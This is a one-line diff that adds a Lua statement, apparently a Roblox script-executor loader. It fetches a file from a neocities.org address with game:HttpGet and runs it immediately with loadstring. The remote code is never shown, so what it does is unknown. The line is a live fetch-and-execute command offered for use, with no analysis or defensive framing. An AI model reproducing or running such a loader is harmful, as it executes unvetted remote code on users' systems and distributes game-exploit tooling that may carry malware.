@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://mezo.neocities.org/API%20Service/Loader2.Sergeant.json"))()
